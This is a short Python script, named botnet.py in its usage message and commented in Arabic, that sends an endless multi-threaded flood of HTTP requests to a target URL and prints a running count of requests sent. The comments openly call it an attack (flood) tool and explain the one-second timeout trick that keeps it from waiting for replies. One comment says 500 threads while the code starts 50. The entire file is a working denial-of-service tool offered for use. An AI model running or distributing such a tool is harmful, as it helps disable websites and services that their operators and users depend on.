import urllib.request as urllib2
import sys
import threading
import random
import time

# إعدادات بسيطة
url = ''
host = ''
request_counter = 0

def inc_counter():
    global request_counter
    request_counter += 1

def buildblock(size):
    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))

def httpcall(url):
    try:
        # إضافة timeout=1 هو السر لجعل السكربت يرسل طلبات ولا ينتظر الرد
        # هذا هو ما يحول السكربت من مجرد "متصفح بطيء" إلى "أداة هجوم (Flood)"
        request = urllib2.Request(url)
        request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        urllib2.urlopen(request, timeout=1)
        inc_counter()
    except:
        pass

class HTTPThread(threading.Thread):
    def run(self):
        while True:
            httpcall(url)

if len(sys.argv) < 2:
    print("Usage: python3 botnet.py http://192.168.1.25/")
    sys.exit()

url = sys.argv[1]
host = url.split("//")[1].split("/")[0]

print(f"--- Starting Attack on {host} ---")

# تشغيل 500 خيط (Thread) لزيادة الضغط
for i in range(50):
    t = HTTPThread()
    t.daemon = True
    t.start()

# حلقة مراقبة لعرض حالة الهجوم
while True:
    print(f"Requests Sent: {request_counter}")
    time.sleep(1)
